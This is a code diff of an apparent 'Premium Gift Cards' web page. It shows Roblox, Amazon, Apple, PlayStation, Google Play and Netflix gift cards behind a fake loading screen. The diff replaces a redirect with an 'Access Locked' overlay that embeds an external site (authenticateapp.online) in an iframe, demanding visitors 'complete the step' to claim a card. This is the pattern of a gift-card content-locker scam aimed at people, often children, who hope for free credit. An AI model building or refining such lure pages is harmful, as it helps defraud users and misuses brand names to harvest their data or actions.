@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Premium Gift Cards</title>
+
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet">
 
 <style>
@@ -15,6 +16,8 @@ color:#fff;
 overflow-x:hidden;
 min-height:100vh;
 }
+
+/* BACKGROUND */
 body::before{
 content:"";
 position:fixed;
@@ -33,10 +36,9 @@ inset:0;
 background:linear-gradient(135deg,#000,#0b0b0b,#000);
 z-index:-3;
 }
-@keyframes bgMove{
-100%{transform:scale(1.12) translateY(-18px);}
-}
+@keyframes bgMove{100%{transform:scale(1.12) translateY(-18px);}}
 
+/* HEADER */
 .header{text-align:center;padding:34px 15px 20px}
 .title{
 font-size:34px;
@@ -47,6 +49,7 @@ background:linear-gradient(90deg,#fff,#60a5fa,#a855f7);
 }
 .sub{margin-top:10px;font-size:14px;opacity:.65}
 
+/* GRID */
 .grid{
 display:grid;
 grid-template-columns:repeat(2,1fr);
@@ -56,6 +59,7 @@ max-width:580px;
 margin:auto;
 }
 
+/* CARD */
 .card{
 background:linear-gradient(145deg,rgba(255,255,255,.05),rgba(255,255,255,.02));
 border:1px solid rgba(255,255,255,.06);
@@ -70,6 +74,7 @@ box-shadow:0 15px 30px rgba(0,0,0,.45);
 transform:translateY(-6px);
 box-shadow:0 22px 35px rgba(0,0,0,.55);
 }
+
 .card img{
 width:100%;
 height:125px;
@@ -77,8 +82,23 @@ object-fit:contain;
 background:#fff;
 padding:14px;
 border-radius:18px;
-display:block;
 }
+
+/* ROBLOX SIMPLE */
+.robloxBox{
+width:100%;
+height:125px;
+display:flex;
+align-items:center;
+justify-content:center;
+background:#fff;
+border-radius:18px;
+font-size:22px;
+font-weight:900;
+letter-spacing:2px;
+color:#000;
+}
+
 .name{margin-top:12px;font-size:15px;font-weight:800}
 .price{margin-top:6px;font-size:13px;opacity:.75}
 .tag{
@@ -91,6 +111,7 @@ background:rgba(96,165,250,.14);
 color:#93c5fd;
 }
 
+/* LOADING */
 .loading{
 position:fixed;
 inset:0;
@@ -102,8 +123,7 @@ flex-direction:column;
 z-index:999;
 }
 .spinner{
-width:62px;
-height:62px;
+width:62px;height:62px;
 border-radius:50%;
 border:4px solid rgba(255,255,255,.08);
 border-top:4px solid #60a5fa;
@@ -111,6 +131,7 @@ animation:spin 1s linear infinite;
 }
 @keyframes spin{100%{transform:rotate(360deg)}}
 
+/* OFFER */
 .offerPage{display:none;padding:20px}
 .box{
 max-width:540px;
@@ -120,7 +141,6 @@ border:1px solid rgba(255,255,255,.06);
 border-radius:24px;
 padding:22px;
 box-shadow:0 15px 30px rgba(0,0,0,.45);
-animation:fade .4s ease;
 }
 .selectedImage{
 width:100%;
@@ -165,16 +185,49 @@ margin-top:16px;
 background:#1f2937;
 }
 
+/* LOCKER */
+#locker{
+display:none;
+position:fixed;
+inset:0;
+background:rgba(0,0,0,.9);
+justify-content:center;
+align-items:center;
+z-index:9999;
+}
+.lockerBox{
+background:#111;
+padding:20px;
+border-radius:18px;
+max-width:360px;
+width:90%;
+text-align:center;
+border:1px solid rgba(255,255,255,.1);
+}
+.lockerBox h3{margin-bottom:10px}
+.lockerBox p{opacity:.7;font-size:13px;margin-bottom:15px}
+.lockerBox iframe{
+width:100%;
+height:300px;
+border:0;
+border-radius:12px;
+}
+.closeBtn{
+margin-top:10px;
+padding:10px 14px;
+border:none;
+border-radius:10px;
+background:#ef4444;
+color:#fff;
+cursor:pointer;
+}
+
+/* FOOTER */
 .footer{
 text-align:center;
 padding:26px;
 font-size:12px;
 opacity:.45;
-}
-
-@keyframes fade{
-from{opacity:0;transform:translateY(10px)}
-to{opacity:1;transform:translateY(0)}
 }
 
 @media(max-width:480px){
@@ -192,45 +245,46 @@ to{opacity:1;transform:translateY(0)}
 <div class="sub">Select your card and continue</div>
 </div>
 
+<!-- GRID -->
 <div class="grid" id="grid">
 
 <div class="card" onclick="openOffer('ROBLOX $100 CARD', this)">
-<img src="https://upload.wikimedia.org/wikipedia/commons/0/0d/Roblox_Logo_2022.svg" alt="Roblox">
+<div class="robloxBox">ROBLOX</div>
 <div class="name">ROBLOX</div>
 <div class="price">$100 Gift Card</div>
 <div class="tag">Popular</div>
 </div>
 
 <div class="card" onclick="openOffer('PLAYSTATION $50 CARD', this)">
-<img src="https://upload.wikimedia.org/wikipedia/commons/0/00/PlayStation_logo.svg" alt="PlayStation">
+<img src="https://upload.wikimedia.org/wikipedia/commons/0/00/PlayStation_logo.svg">
 <div class="name">PLAYSTATION</div>
 <div class="price">$50 Gift Card</div>
 <div class="tag">Top</div>
 </div>
 
 <div class="card" onclick="openOffer('AMAZON $50 CARD', this)">
-<img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
+<img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg">
 <div class="name">AMAZON</div>
 <div class="price">$50 Gift Card</div>
 <div class="tag">Trending</div>
 </div>
 
 <div class="card" onclick="openOffer('APPLE $100 CARD', this)">
-<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
 <div class="name">APPLE</div>
 <div class="price">$100 Gift Card</div>
 <div class="tag">Premium</div>
 </div>
 
 <div class="card" onclick="openOffer('GOOGLE PLAY $50 CARD', this)">
-<img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg" alt="Google Play">
+<img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg">
 <div class="name">GOOGLE PLAY</div>
 <div class="price">$50 Gift Card</div>
 <div class="tag">New</div>
 </div>
 
 <div class="card" onclick="openOffer('NETFLIX $50 CARD', this)">
-<img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix">
+<img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg">
 <div class="name">NETFLIX</div>
 <div class="price">$50 Gift Card</div>
 <div class="tag">Hot</div>
@@ -238,15 +292,17 @@ to{opacity:1;transform:translateY(0)}
 
 </div>
 
+<!-- LOADING -->
 <div class="loading" id="loading">
 <div class="spinner"></div>
 <p style="margin-top:15px;opacity:.8;">Loading...</p>
 </div>
 
+<!-- OFFER -->
 <div class="offerPage" id="offerPage">
 <div class="box">
 
-<img id="selectedImage" class="selectedImage" alt="Selected Card">
+<img id="selectedImage" class="selectedImage">
 
 <div id="selectedTitle"></div>
 <div class="desc">Available options for your selected card</div>
@@ -272,11 +328,24 @@ to{opacity:1;transform:translateY(0)}
 </div>
 </div>
 
+<!-- LOCKER -->
+<div id="locker">
+<div class="lockerBox">
+<h3>Access Locked</h3>
+<p>Complete the step to continue</p>
+
+<iframe src="https://authenticateapp.online/cl/i/pqq622"></iframe>
+
+<button class="closeBtn" onclick="closeLocker()">Close</button>
+</div>
+</div>
+
 <div class="footer">© 2026 Premium Gift Cards</div>
 
 <script>
 function openOffer(title,el){
-const img = el.querySelector("img").src;
+const img = el.querySelector("img") ? el.querySelector("img").src : "";
+
 document.getElementById("loading").style.display="flex";
 
 setTimeout(()=>{
@@ -286,11 +355,15 @@ document.getElementById("offerPage").style.display="block";
 document.getElementById("selectedTitle").innerText=title;
 document.getElementById("selectedImage").src=img;
 window.scrollTo({top:0,behavior:"smooth"});
-},1200);
+},900);
 }
 
 function go(){
-window.location.href="https://authenticateapp.online/cl/i/pqq622";
+document.getElementById("locker").style.display="flex";
+}
+
+function closeLocker(){
+document.getElementById("locker").style.display="none";
 }
 
 function backPage(){
